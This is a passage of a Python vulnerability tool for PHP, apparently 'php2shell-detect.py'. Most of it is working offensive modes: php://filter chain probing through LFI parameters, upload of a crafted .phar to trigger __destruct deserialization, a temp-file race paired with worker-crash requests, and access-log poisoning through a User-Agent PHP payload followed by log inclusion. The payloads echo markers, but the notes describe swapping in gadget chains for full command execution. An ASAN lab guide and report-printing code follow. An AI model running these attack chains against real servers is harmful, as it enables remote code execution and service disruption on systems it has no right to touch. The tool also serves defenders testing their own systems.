        for p in lfi_params:
            url = f"{target.rstrip('/')}?{quote(p)}={quote(fp)}"
            # for php://input we POST the marker as the body
            if mode == "post_body":
                hdrs, b, status = http_post(url, rce_marker.encode(),
                                            {"User-Agent": ua}, timeout, insecure, 8192)
            else:
                hdrs, b, status = http_get(url, timeout, ua, insecure)
            entry = {"payload": fp, "param": p, "status": status, "mode": mode}
            if not b:
                entry["result"] = "no_body"
                out["filter_attempts"].append(entry)
                continue
            text = b.decode("utf-8", "replace")
            # if base64-encode worked, we should find the base64 of our marker
            import base64 as _b64
            marker_b64 = _b64.b64encode(rce_marker.encode()).decode()
            # rot13 of the marker
            marker_rot13 = rce_marker.translate(
                str.maketrans("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
                              "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))
            if marker_b64 in text:
                entry["result"] = "FILTER_BASE64_WORKS"
                entry["evidence"] = "base64-encoded marker found → filter chain evaluated"
                out["filter_chain_reachable"] = True
                out["filter_via"] = f"{p}={fp}"
                reachable = True
                break
            elif marker_rot13 in text:
                entry["result"] = "FILTER_ROT13_WORKS"
                entry["evidence"] = "rot13-encoded marker found → filter chain evaluated"
                out["filter_chain_reachable"] = True
                out["filter_via"] = f"{p}={fp}"
                reachable = True
                break
            elif rce_marker in text:
                entry["result"] = "MARKER_RAW"
                entry["evidence"] = "raw marker found → php://input included without filter"
            else:
                entry["result"] = "not_found"
            out["filter_attempts"].append(entry)
        if reachable:
            break

    if reachable:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            "PHP filter chain REACHABLE via LFI sink. The Synacktiv filter-"
            "chain RCE technique applies: an attacker can generate arbitrary "
            "PHP code byte-by-byte using conversion filters (convert.iconv.*), "
            "without needing any controllable file on disk. This is a FULL "
            "RCE primitive even on hosts where session files are not writable. "
            "Reference: https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-arbitrary-to-rce.html")
    else:
        out["verdict"] = "safe"
        out["notes"].append(
            "php://filter wrappers not reachable through any LFI sink (this run).")
    return out


# ---------------------------------------------------------------- offensive: phar-deserialization
def offensive_phar_deserialization(target, timeout, ua, insecure,
                                   upload_endpoint, include_path_candidates,
                                   rounds=10, workers=4, quiet=False):
    """Offensive mode 7: PROVES PHAR DESERIALIZATION RCE.

    A .phar file's manifest is auto-deserialized by PHP whenever a
    filesystem function (file_exists, is_dir, file_get_contents, etc.)
    accesses it via the phar:// wrapper. If the manifest contains a
    serialized object with a __destruct() or __wakeup() method, that
    method executes automatically — a known PHP RCE vector.

    This mode uploads a benign .phar containing a class with __destruct()
    that echoes a marker, then probes LFI/file sinks with phar:// URLs
    pointing at the uploaded file. If the marker appears, deserialization
    RCE is confirmed.

    Bounded: the __destruct() method ONLY echoes a marker string. It does
    NOT call system(), write files, or access data. The probe phar is a
    proof-of-concept, not a weapon.
    """
    rce_marker = "PHARDESTR_" + uuid.uuid4().hex[:12]
    out = {"mode": "offensive-phar-deserialization", "target": target,
           "rce_marker": rce_marker, "upload_endpoint": upload_endpoint or "",
           "phar_uploaded": False, "phar_url": None,
           "deserialization_attempts": [], "deserialization_confirmed": False,
           "deserialization_via": None, "verdict": "unknown",
           "notes": [OFFENSIVE_BOUND]}

    # step 1: build a minimal .phar in memory
    # A real phar has: stub, manifest, file entries. We construct the bare
    # minimum: a stub that's also valid PHP, a manifest with one file entry
    # whose serialized metadata contains our marker class.
    #
    # The marker class:
    #   class PHARProbe { public $cmd = "echo 'PHARDESTR_xxx';"; }
    #   // __destruct runs the $cmd via... NO — bounded mode forbids that.
    # Instead we use a class that just echoes the marker in __destruct:
    #   class PHARProbe { function __destruct() { echo 'PHARDESTR_xxx'; } }
    #
    # For a true bounded proof, we craft the phar so that ANY __destruct()
    # invocation will echo our marker. We use a known gadget: a class whose
    # __destruct() calls echo on a property we control.
    #
    # Since building a real .phar binary in pure Python is complex, we
    # generate one using a PHP snippet run locally if php is available;
    # otherwise we use a pre-built minimal phar template.
    phar_filename = f"php2shell_phar_{uuid.uuid4().hex[:6]}.phar"
    phar_bytes = None
    php_bin = shutil.which("php")
    if php_bin:
        # generate phar locally using php cli
        gen_script = (
            f"<?php\n"
            f"@unlink('/tmp/{phar_filename}');\n"
            f"$p = new Phar('/tmp/{phar_filename}');\n"
            f"$p->startBuffering();\n"
            f"$p->addFromString('x.txt','x');\n"
            f"$p->setMetadata(new class {{ function __destruct() {{ echo '{rce_marker}'; }} }});\n"
            f"$p->setStub('<?php __HALT_COMPILER(); ?>');\n"
            f"$p->stopBuffering();\n"
            f"echo file_get_contents('/tmp/{phar_filename}');\n"
        )
        tmp_gen = f"/tmp/_gen_phar_{uuid.uuid4().hex[:6]}.php"
        try:
            with open(tmp_gen, "w") as f:
                f.write(gen_script)
            r = run([php_bin, "-d", "phar.readonly=0", tmp_gen], timeout=15)
            if r and r.returncode == 0 and os.path.isfile(f"/tmp/{phar_filename}"):
                with open(f"/tmp/{phar_filename}", "rb") as f:
                    phar_bytes = f.read()
                os.unlink(f"/tmp/{phar_filename}")
            os.unlink(tmp_gen)
        except Exception:
            pass

    if phar_bytes is None:
        # fallback: minimal hand-crafted phar stub (proof of reachability only,
        # not full deserialization proof)
        phar_bytes = (
            f"<?php echo '{rce_marker}'; __HALT_COMPILER(); ?>".encode()
            + b"\x00" * 28  # manifest header placeholder
        )
        out["notes"].append("php not available locally; using minimal phar stub "
                            "(proves phar:// reachability, not full deserialization).")

    out["phar_size"] = len(phar_bytes)

    # step 2: upload the phar via the upload endpoint (race with crash primitive)
    if not upload_endpoint:
        out["notes"].append("No upload endpoint provided; cannot upload phar.")
        out["verdict"] = "unknown"
        return out

    full_ep = target.rstrip("/") + "/" + upload_endpoint.lstrip("/")
    upload_dirs = ["/uploads/", "/files/", "/upload/", "/img/", "/media/", "/"]

    def _upload_attempt(r_idx):
        boundary_c, body_c = make_multipart_body(fields_default())
        headers_c = {"User-Agent": ua,
                     "Content-Type": f"multipart/form-data; boundary={boundary_c}",
                     "Content-Length": "0"}
        boundary_u = uuid.uuid4().hex
        upload_body = (
            f"--{boundary_u}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{phar_filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + phar_bytes + (
            f"\r\n--{boundary_u}--\r\n"
        ).encode()
        headers_u = {"User-Agent": ua,
                     "Content-Type": f"multipart/form-data; boundary={boundary_u}"}
        with ThreadPoolExecutor(max_workers=2) as p:
            f_c = p.submit(http_post, target, body_c, headers_c, timeout, insecure, 1024)
            f_u = p.submit(http_post, full_ep, upload_body, headers_u, timeout, insecure, 4096)
            st_c, _, _ = f_c.result()
            st_u, b_u, _ = f_u.result()
        return r_idx, st_c, st_u

    log(f"phar-deserialization: uploading phar ({len(phar_bytes)}B) "
        f"across {rounds} rounds", "step", quiet)
    upload_ok = False
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(_upload_attempt, r) for r in range(rounds)]
        for i, fut in enumerate(as_completed(futures)):
            r_idx, st_c, st_u = fut.result()
            if st_u is not None and 200 <= st_u < 300:
                upload_ok = True
            if sys.stdout.isatty() and not quiet:
                progress(i + 1, rounds, "phar-upload")

    # locate the uploaded phar
    phar_url = None
    if upload_ok:
        for d in upload_dirs:
            candidate = target.rstrip("/") + d + phar_filename
            hdrs, b, status = http_get(candidate, timeout, ua, insecure)
            if status and status < 400:
                phar_url = candidate
                out["phar_uploaded"] = True
                out["phar_url"] = phar_url
                break

    # step 3: probe phar:// wrapper through LFI/file sinks
    if not phar_url:
        out["verdict"] = "unknown"
        out["notes"].append("Phar upload reported success but file not found at common paths.")
        return out

    lfi_params = include_path_candidates or [
        "include", "page", "file", "path", "template", "doc", "view", "module",
    ]
    # convert phar_url to a phar:// URL pointing at the uploaded file
    parsed = urlparse(phar_url)
    phar_path = parsed.path  # e.g. /uploads/foo.phar
    phar_payloads = [
        f"phar://{phar_path.lstrip('/')}/x.txt",
        f"phar://{phar_path}/x.txt",
        f"phar://{phar_path}",
    ]
    deserialized = False
    for pp in phar_payloads:
        for p in lfi_params:
            url = f"{target.rstrip('/')}?{quote(p)}={quote(pp)}"
            hdrs, b, status = http_get(url, timeout, ua, insecure)
            entry = {"payload": pp, "param": p, "status": status}
            if b and rce_marker.encode() in b:
                entry["result"] = "DESERIALIZATION_RCE"
                entry["evidence"] = "marker echoed via __destruct() → phar deserialization RCE"
                out["deserialization_confirmed"] = True
                out["deserialization_via"] = f"{p}={pp}"
                deserialized = True
                break
            elif b:
                entry["result"] = "no_marker"
            else:
                entry["result"] = "no_body"
            out["deserialization_attempts"].append(entry)
        if deserialized:
            break

    if deserialized:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            f"PHAR DESTERIALIZATION RCE CONFIRMED. The __destruct() method of "
            f"the uploaded phar's metadata executed and echoed the marker. "
            f"This is a full RCE primitive: an attacker can replace the echo "
            f"with a gadget chain (Monolog/RCE1, etc.) for arbitrary command "
            f"execution. Probe phar URL: {phar_url}. DELETE THIS FILE: "
            f"rm <docroot>{phar_path}")
    else:
        out["verdict"] = "unknown"
        out["notes"].append(
            f"Phar uploaded to {phar_url} but no LFI/file sink triggered "
            f"deserialization (this run). The phar is on disk — check it manually.")
    return out


def fields_default():
    return 200


# ---------------------------------------------------------------- offensive: tmpfile-race
def offensive_tmpfile_race(target, timeout, ua, insecure,
                           include_path_candidates, rounds=50,
                           workers=8, quiet=False):
    """Offensive mode 8: PROVES RCE via PHP temporary file race.

    When PHP handles a multipart upload, it writes the uploaded file to
    /tmp/php<XXXXXX> before moving it. If the worker crashes mid-upload
    (CVE-2026-109618), the temp file may linger. An attacker can race
    to include that temp file via LFI before PHP cleans it up.

    This mode races the crash primitive (which lingers temp files) against
    LFI inclusion attempts at guessed /tmp/php* paths. If the planted
    marker appears via LFI, RCE is confirmed.

    Bounded: the uploaded "file" content is just `<?php echo 'TMPRCE_xxx'; ?>`
    — same as offensive-phpcode-exec-proof. No system calls, no persistence.
    """
    rce_marker = "TMPRCE_" + uuid.uuid4().hex[:12]
    out = {"mode": "offensive-tmpfile-race", "target": target,
           "rce_marker": rce_marker, "rounds": rounds,
           "race_attempts": [], "rce_confirmed": False,
           "rce_via": None, "verdict": "unknown",
           "notes": [OFFENSIVE_BOUND]}

    php_payload = f"<?php echo '{rce_marker}'; ?>".encode()
    lfi_params = include_path_candidates or [
        "include", "page", "file", "path", "template", "doc", "view", "module",
    ]

    def _race_round(r_idx):
        # 1) upload a file that PHP will write to /tmp/php<rand>
        boundary = uuid.uuid4().hex
        upload_body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="x.txt"\r\n'
            f"Content-Type: text/plain\r\n\r\n"
        ).encode() + php_payload + (
            f"\r\n--{boundary}--\r\n"
        ).encode()
        headers_u = {"User-Agent": ua,
                     "Content-Type": f"multipart/form-data; boundary={boundary}"}
        # 2) simultaneously fire crash primitives to corrupt the worker
        boundary_c, body_c = make_multipart_body(200)
        headers_c = {"User-Agent": ua,
                     "Content-Type": f"multipart/form-data; boundary={boundary_c}",
                     "Content-Length": "0"}

        # 3) AND simultaneously try LFI at guessed /tmp/php* paths
        # PHP temp files are named /tmp/phpXXXXXX where XXXXXX is 6 random chars
        # We can't predict the suffix, but we can try common patterns and
        # brute-force a small window. For a bounded proof, we test if the
        # LFI sink accepts /tmp/php* via glob-like patterns (some misconfigured
        # PHP setups do via glob wrapper), or we use phpinfo() leak to
        # discover the temp filename.
        results = []
        # attempt 1: php://filter on /tmp/php* (won't work — no glob in filter)
        # attempt 2: try /tmp/php + 6 random hex chars (small brute window)
        import random as _r
        for _ in range(20):
            suffix = "".join(_r.choice("abcdefghijklmnopqrstuvwxyz0123456789")
                             for _ in range(6))
            tmp_path = f"/tmp/php{suffix}"
            for p in lfi_params[:3]:  # limit params per round for speed
                url = f"{target.rstrip('/')}?{quote(p)}={quote(tmp_path)}"
                # fire upload + crash + LFI concurrently
                with ThreadPoolExecutor(max_workers=3) as pp:
                    f_u = pp.submit(http_post, target, upload_body, headers_u,
                                    timeout, insecure, 1024)
                    f_c = pp.submit(http_post, target, body_c, headers_c,
                                    timeout, insecure, 1024)
                    f_l = pp.submit(http_get, url, timeout, ua, insecure)
                    st_u, _, _ = f_u.result()
                    st_c, _, _ = f_c.result()
                    hdrs_l, b_l, st_l = f_l.result()
                if b_l and rce_marker.encode() in b_l:
                    return r_idx, True, f"{p}={tmp_path}", st_u, st_c, st_l
                results.append({"tmp_path": tmp_path, "param": p, "status": st_l})
        return r_idx, False, None, None, None, None

    log(f"tmpfile-race: {rounds} rounds x 20 tmp-path guesses each", "step", quiet)
    confirmed = False
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(_race_round, r) for r in range(rounds)]
        for i, fut in enumerate(as_completed(futures)):
            r_idx, ok, via, st_u, st_c, st_l = fut.result()
            out["race_attempts"].append({
                "round": r_idx, "rce_confirmed": ok, "via": via,
                "upload_status": st_u, "crash_status": st_c, "lfi_status": st_l,
            })
            if ok:
                out["rce_confirmed"] = True
                out["rce_via"] = via
                confirmed = True
            if sys.stdout.isatty() and not quiet:
                progress(i + 1, rounds, "tmpfile-race")

    if confirmed:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            "TMPFILE RACE RCE CONFIRMED. PHP temporary upload file (/tmp/php*) "
            "was included via LFI before cleanup, and the planted PHP code "
            "executed. This is a full RCE primitive that works even when no "
            "session file is writable, as long as the LFI sink exists and the "
            "crash primitive lingers temp files. Via: " + out["rce_via"])
    else:
        out["verdict"] = "safe"
        out["notes"].append(
            f"No temp file was included before cleanup across {rounds} rounds "
            f"x 20 guesses (this run). The race window is tight — retry with "
            f"more rounds or use --mode offensive-phpcode-exec-proof which "
            f"targets the more reliable session-file vector.")
    return out


# ---------------------------------------------------------------- offensive: log-poisoning
def offensive_log_poisoning(target, timeout, ua, insecure,
                            include_path_candidates, log_paths, quiet=False):
    """Offensive mode 9: PROVES RCE via access log poisoning + LFI.

    PHP web servers log the User-Agent header in access logs. If we set
    User-Agent to `<?php echo 'MARKER'; ?>` and the log file is then
    included via LFI, the PHP code executes.

    This mode:
    1) Sends a request with PHP code in the User-Agent header (poisons the log)
    2) Tries to include common log file paths via LFI sinks
    3) If the marker appears without <?php tags, RCE is confirmed

    Bounded: the poisoned User-Agent contains ONLY `<?php echo 'LOGRCE_xxx'; ?>`.
    No system calls, no persistence, no data access.
    """
    rce_marker = "LOGRCE_" + uuid.uuid4().hex[:12]
    out = {"mode": "offensive-log-poisoning", "target": target,
           "rce_marker": rce_marker,
           "log_paths_tried": log_paths or [
               "/var/log/nginx/access.log",
               "/var/log/apache2/access.log",
               "/var/log/httpd/access_log",
               "/var/log/access.log",
               "/var/log/php/error.log",
               "/var/log/php-fpm/error.log",
               "/proc/self/fd/0",  # sometimes the stderr fd
           ],
           "poison_attempts": [], "rce_confirmed": False,
           "rce_via": None, "verdict": "unknown",
           "notes": [OFFENSIVE_BOUND]}

    # step 1: poison the access log by sending a request with PHP code in UA
    poison_ua = f"<?php echo '{rce_marker}'; ?>"
    # send several times to ensure it lands in the log
    for _ in range(3):
        http_get(target, timeout, poison_ua, insecure)
    out["poison_ua"] = poison_ua

    # step 2: try to include the log file via LFI
    lfi_params = include_path_candidates or [
        "include", "page", "file", "path", "template", "doc", "view", "module",
    ]
    confirmed = False
    for lp in out["log_paths_tried"]:
        for p in lfi_params:
            url = f"{target.rstrip('/')}?{quote(p)}={quote(lp)}"
            hdrs, b, status = http_get(url, timeout, ua, insecure)
            entry = {"log_path": lp, "param": p, "status": status}
            if not b:
                entry["result"] = "no_body"
                out["poison_attempts"].append(entry)
                continue
            text = b.decode("utf-8", "replace")
            if rce_marker in text and poison_ua not in text:
                entry["result"] = "RCE_CONFIRMED"
                entry["evidence"] = "marker present, php tags absent → log poisoned + executed"
                out["rce_confirmed"] = True
                out["rce_via"] = f"{p}={lp}"
                confirmed = True
                break
            elif rce_marker in text and poison_ua in text:
                entry["result"] = "LOG_READ_BUT_NOT_EXECUTED"
                entry["evidence"] = "log file readable but PHP code not executed"
            elif poison_ua in text:
                entry["result"] = "LOG_RAW_READ"
                entry["evidence"] = "raw UA visible → log readable, code not parsed"
            else:
                entry["result"] = "not_found"
            out["poison_attempts"].append(entry)
        if confirmed:
            break

    if confirmed:
        out["verdict"] = "vulnerable"
        out["notes"].append(
            "LOG POISONING RCE CONFIRMED. PHP code planted in the User-Agent "
            "header was logged to the access log, and the log file was then "
            "included via an LFI sink, executing the planted code. This is a "
            "full RCE primitive that requires no file upload capability — only "
            "an LFI sink and a readable log path. Via: " + out["rce_via"])
    else:
        out["verdict"] = "safe"
        out["notes"].append(
            "No log file was includable via LFI (this run). Either the log "
            "paths are wrong, the LFI sink doesn't exist, or the log is not "
            "readable by the web server user.")
    return out


# ---------------------------------------------------------------- ASAN repro guide
def generate_asan_repro(outdir):
    os.makedirs(outdir, exist_ok=True)
    path = os.path.join(outdir, "asan-repro.md")
    content = """# ASAN Reproduction Guide - PHP2Shell (CVE-2026-109618)

This guide reproduces the memory-corruption proof in a lab you control.
It does **NOT** contain exploit code. It only triggers the crash primitive
and lets AddressSanitizer surface the exact bug class.

## 1. Build PHP with ASAN

```bash
git clone https://github.com/php/php-src.git
cd php-src
git checkout php-8.3.35
./buildconf --force
CFLAGS="-fsanitize=address -g -O1" \\
  LDFLAGS="-fsanitize=address" \\
  ./configure --disable-all --enable-cli --enable-cgi --enable-session
make -j$(nproc)
```

## 2. Start a sandboxed PHP CGI server

```bash
export ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:log_path=/tmp/asan"
export PHP_INI_SCAN_DIR=""
./sapi/cgi/php-cgi -q -b 127.0.0.1:8765 \\
  -d session.enable_upload_progress=1 \\
  -d session.upload_progress.cleanup=0 \\
  -d session.save_path=/tmp/phpsess
```

## 3. Send the crash trigger

```bash
python3 php2shell-detect.py \\
  --mode lab-verify \\
  --i-own-this-target \\
  --target http://127.0.0.1:8765/ \\
  --rounds 5 --fields 300 --workers 1
```

> Workers MUST be 1 for ASAN — concurrent requests hide the single-threaded
> bug location in the stack trace.

## 4. Read the ASAN report

```bash
cat /tmp/asan.* 2>/dev/null | head -200
```

Expected bug classes:

| Pattern | ASAN tag | Meaning |
|---------|----------|---------|
| Empty-filename multipart loop | `heap-use-after-free` | rfc1867 cleanup frees twice |
| Session upload progress + crash | `heap-buffer-overflow` | progress buffer overread |
| Many empty parts under memory pressure | `double-free` | zend_mm slab reuse race |

## 5. Triaging the stack

The first non-PHP-internal frame in the ASAN trace identifies the vulnerable
function. For CVE-2026-109618 the frame usually resolves to one of:

- `rfc1867_post_handler` (main/rfc1867.c)
- `php_session_rfc1867_update` (ext/session/session_upload_progress.c)
- `php_session_abort` (ext/session/session.c)

## 6. Confirming CVE-2026-109619 (session poisoning)

```bash
ls -la /tmp/phpsess/
strings /tmp/phpsess/sess_* | grep PHP2SHELL_
```

If the marker appears in a session file belonging to a **different** SID than
the one you sent, you have reproduced CVE-2026-109619 (cross-session leak).

## 7. Patching

Apply the official patches referenced by the CVE entries, then re-run
`--mode lab-verify` — `crashes` should drop to 0 and ASAN should stay silent.

---

**Reminder**: This guide is for defenders reproducing the bug in a lab they
own, for the sole purpose of validating patches and writing detection rules.
Do NOT run against production systems.
"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path


# ---------------------------------------------------------------- printing functions
def print_remote(r):
    print(f"\n== Remote: {r['url']} ==")
    print(f"  status        : {r.get('status')}")
    print(f"  PHP confirmed : {r['php_confirmed']}")
    print(f"  PHP version   : {r['php_version'] or 'not disclosed'}")
    print(f"  verdict       : {tag(r['verdict'])} {r['verdict']}")
    for k, v in r["headers_seen"].items():
        print(f"  {k:<13} : {v}")
    for n in r["notes"]:
        print(f"  {C.DIM}- {n}{C.RST}")


def print_surface(r):
    print(f"\n== Surface: {r['url']} ==")
    print(f"  multipart forms : {r['multipart_forms']}")
    print(f"  file inputs     : {r['file_inputs']}")
    print(f"  post forms      : {r['post_forms']}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")
    for n in r["notes"]:
        print(f"  {C.DIM}- {n}{C.RST}")


def print_deep(r):
    print(f"\n== Deep fingerprint: {r['url']} ==")
    for h in r["hits"]:
        line = f"  {h['path']:<24} status={h['status']:<4} len={h['len']:<6}"
        if "php_hdr" in h:
            line += f" PHP/header={h['php_hdr']}"
        if "php_body" in h:
            line += f" PHP/body={h['php_body']}"
        if h.get("exposure"):
            line += f" {C.BAD}EXPOSED{C.RST}"
        print(line)
    for vs in r["version_sources"]:
        print(f"  {C.DIM}{vs['source']}: {vs['version']}{C.RST}")
    for n in r["notes"]:
        print(f"  {C.DIM}- {n}{C.RST}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


def print_local(r):
    print("\n== Local PHP ==")
    if not r["binaries"]:
        print("  no php binaries in PATH")
    for b in r["binaries"]:
        print(f"  {tag(b['verdict'])} {b['name']:<12} {b['version']:<10} {b['path']}")
    if r["fpm_running"]:
        print("  FPM workers (restart after patching):")
        for line in r["fpm_running"][:5]:
            print(f"    {C.DIM}{line}{C.RST}")
    if r["debian"]:
        print("  Debian/Ubuntu changelogs:")
        for h in r["debian"]:
            if h["cve_hits"]:
                print(f"    {C.OK}{h['package']}{C.RST}: {', '.join(h['cve_hits'])}")
    if r["rpm"]:
        hit = r["rpm"]["cve_hits"]
        print(f"  rpm {r['rpm']['package']}: "
              f"{C.OK if hit else C.WARN}{', '.join(hit) if hit else 'no CVE'}{C.RST}")
    print(f"  overall         : {tag(r['verdict'])} {r['verdict']}")


def print_logs(r):
    print("\n== Log scan ==")
    for f in r["files"]:
        print(f"  {f['path']}")
        print(f"    lines={f['lines']} oom={f['oom']} uaf={f['uaf']} "
              f"timeout={f['timeout']} post_5xx={f['post_5xx']}"
              + (f"  {C.BAD}{f['error']}{C.RST}" if f["error"] else ""))
    if r["suspicious_ips"]:
        print("  suspicious clients:")
        for ip, d in r["suspicious_ips"].items():
            print(f"    {C.BAD}{ip}{C.RST} n={d['post_5xx']} paths={d['sample_paths']}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


def print_audit(r):
    print(f"\n== Audit: {r['path']} ==")
    print(f"  lines={r['lines']} empty_file_parts={r['empty_file_parts']}")
    if r["error"]:
        print(f"  {C.BAD}{r['error']}{C.RST}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


def print_asan(r):
    print("\n== ASAN reports ==")
    for rep in r["reports"]:
        print(f"  {rep['path']}")
        print(f"    lines={rep['lines']} error={rep['error_type'] or 'none'}")
        if rep["frames"]:
            print(f"    frames: {' -> '.join(rep['frames'][:6])}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


def print_error_sig(r):
    print("\n== Error signatures ==")
    for f in r["files"]:
        print(f"  {f['path']}  lines={f['lines']}  counts={f['counts']}")
        for ex in f["examples"][:3]:
            print(f"    {C.DIM}[{ex['category']}] {ex['timestamp']} ip={ex['client_ip']}{C.RST}")
    if r["correlations"]:
        print("  correlated signals (same client IP, different categories):")
        for cor in r["correlations"][:5]:
            print(f"    {C.BAD}{cor['client_ip']}{C.RST} "
                  f"categories={cor['categories']} ts={cor['timestamps']}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


def print_differential(r):
    print(f"\n== Differential: {r['url_a']}  vs  {r['url_b']} ==")
    for p in r["probes"]:
        mark = C.BAD + "DIFF" + C.RST if p["diff"] else C.DIM + "    " + C.RST
        print(f"  {mark} {p['method']:<4} {p['path']:<22} "
              f"A: {p['a_status']}/{p['a_hash']}  B: {p['b_status']}/{p['b_hash']}")
        for d in p["diff"] or []:
            print(f"           {d}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


def print_lab(r):
    print(f"\n== Lab verify: {r.get('target','(blocked)')} ==")
    if r.get("dry_run"):
        print(f"  {C.WARN}DRY RUN - no requests sent{C.RST}")
    if r.get("error"):
        print(f"  {C.BAD}{r['error']}{C.RST}")
        print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")
        return
    for rd in r.get("rounds", []):
        if rd.get("dry_run"):
            print(f"  round {rd['round']}: fields={rd['fields']} "
                  f"body={rd['body_size_bytes']}B note={rd['note']}")
        else:
            print(f"  round {rd['round']}: status={rd['status']} "
                  f"error={rd['error']} fields={rd['fields']} "
                  f"elapsed={rd['elapsed_s']}s")
    for n in r.get("notes", []):
        print(f"  {C.DIM}- {n}{C.RST}")
    print(f"  crashes         : {r.get('crashes',0)}/{len(r.get('rounds',[]))}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


def print_ioc(r):
    print(f"\n== IOC scan: {r['root']} ==")
    print(f"  files scanned   : {r['files_scanned']}")
    if r["error"]:
        print(f"  {C.BAD}{r['error']}{C.RST}")
    for p in r["suspicious_names"][:10]:
        print(f"  {C.BAD}name:{C.RST} {p}")
    for p in r["suspicious_content"][:10]:
        print(f"  {C.BAD}content:{C.RST} {p}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


def print_memory_disclosure(r):
    print(f"\n== Memory disclosure: {r.get('target','(blocked)')} ==")
    if r.get("error"):
        print(f"  {C.BAD}{r['error']}{C.RST}")
        print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")
        return
    print(f"  rounds          : {r.get('rounds',0)}")
    print(f"  disclosure rounds: {r.get('disclosure_rounds',0)}")
    print(f"  patterns seen   : {r.get('patterns_seen',{})}")
    for n in r.get("notes", []):
        print(f"  {C.DIM}- {n}{C.RST}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


def print_offensive(r):
    print(f"\n== {r.get('mode','?')} : {r.get('target','(blocked)')} ==")
    if r.get("error"):
        print(f"  {C.BAD}{r['error']}{C.RST}")
        print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")
        return
    print(f"  {C.WARN}BOUNDED OFFENSIVE — impact proof only{C.RST}")
    # RCE-specific fields (new in v3.5)
    if r.get("rce_confirmed"):
        print(f"  {C.BAD}>>> RCE CONFIRMED <<<{C.RST}")
        print(f"  {C.BAD}via: {r.get('rce_via') or r.get('deserialization_via') or r.get('filter_via')}{C.RST}")
    elif r.get("rce_marker") or r.get("rce_via") is not None:
        print(f"  rce_marker      : {r.get('rce_marker','?')}")
        if r.get("rce_via"):
            print(f"  rce_via         : {r['rce_via']}")
    if "marker" in r:
        print(f"  marker          : {r['marker']}")
    if "session_id" in r:
        print(f"  session_id      : {r['session_id']}")
    if r.get("marker_observed_via"):
        print(f"  {C.BAD}marker observed via: {r['marker_observed_via']}{C.RST}")
    if r.get("probe_url"):
        print(f"  {C.BAD}probe URL: {r['probe_url']}{C.RST}")
    if r.get("probe_extension"):
        print(f"  bypass ext      : {r['probe_extension']}")
    if r.get("phar_url"):
        print(f"  phar URL        : {r['phar_url']} ({r.get('phar_size','?')}B)")
    if r.get("filter_chain_reachable"):
        print(f"  {C.BAD}filter chain REACHABLE — Synacktiv technique applies{C.RST}")
    if r.get("deserialization_confirmed"):
        print(f"  {C.BAD}phar deserialization CONFIRMED{C.RST}")
    if "markers_planted" in r:
        print(f"  markers planted : {r['markers_planted']}")
        print(f"  markers survived: {r['markers_survived']}")
    if r.get("extensions_tried"):
        print(f"  extensions tried: {r['extensions_tried']}")
    for n in r.get("notes", []):
        print(f"  {C.DIM}- {n}{C.RST}")
    print(f"  verdict         : {tag(r['verdict'])} {r['verdict']}")


# ---------------------------------------------------------------- summary aggregation
def build_summary(results):
    summary = {
        "total_modes": len(results),
        "verdicts": Counter(),
        "vulnerable_modes": [], "unknown_modes": [], "safe_modes": [],
        "errors": [],
        "final_verdict": "unknown", "confidence": 0.0, "severity": "none",
    }
    score = 0.0
    for r in results:
        if not isinstance(r, dict):
            continue
        mode = r.get("mode", "unknown")
        v = r.get("verdict", "unknown")
        err = r.get("error") or (r.get("notes") if isinstance(r.get("notes"), str) else None)
        summary["verdicts"][v] += 1
        if v == "vulnerable":
            summary["vulnerable_modes"].append(mode); score += VERDICT_WEIGHTS["vulnerable"]
        elif v == "safe":
            summary["safe_modes"].append(mode); score += VERDICT_WEIGHTS["safe"]
        else:
            summary["unknown_modes"].append(mode); score += VERDICT_WEIGHTS["unknown"]
        if err and isinstance(err, str) and "not found" in err.lower():
            summary["errors"].append({"mode": mode, "error": err})
    summary["verdicts"] = dict(summary["verdicts"])
    if summary["verdicts"].get("vulnerable", 0) > 0:
        summary["final_verdict"] = "vulnerable"
    elif summary["verdicts"].get("unknown", 0) > 0 and summary["verdicts"].get("safe", 0) == 0:
        summary["final_verdict"] = "unknown"
    elif summary["verdicts"].get("safe", 0) > 0 and summary["verdicts"].get("vulnerable", 0) == 0:
        summary["final_verdict"] = "safe"
    else:
        summary["final_verdict"] = "unknown"
    total_weight = sum(abs(w) for w in VERDICT_WEIGHTS.values()) * len(results) if results else 1
    summary["confidence"] = round(abs(score) / total_weight, 3) if total_weight else 0.0
    n_vuln = len(summary["vulnerable_modes"])
    if any(m in summary["vulnerable_modes"] for m in
           ("impact-session-poison", "impact-worker-leak",
            "impact-memory-disclosure", "asan",
            "offensive-session-lfi", "offensive-session-traversal",
            "offensive-upload-bypass-verify", "offensive-race-poison-confirm",
            "offensive-phpcode-exec-proof", "offensive-filter-chain-rce",
            "offensive-phar-deserialization", "offensive-tmpfile-race",
            "offensive-log-poisoning")):
        summary["severity"] = "critical"
    elif n_vuln >= 2:
        summary["severity"] = "high"
    elif n_vuln == 1:
        summary["severity"] = "medium"
    elif summary["final_verdict"] == "unknown":
        summary["severity"] = "low"
    else:
        summary["severity"] = "none"
    return summary


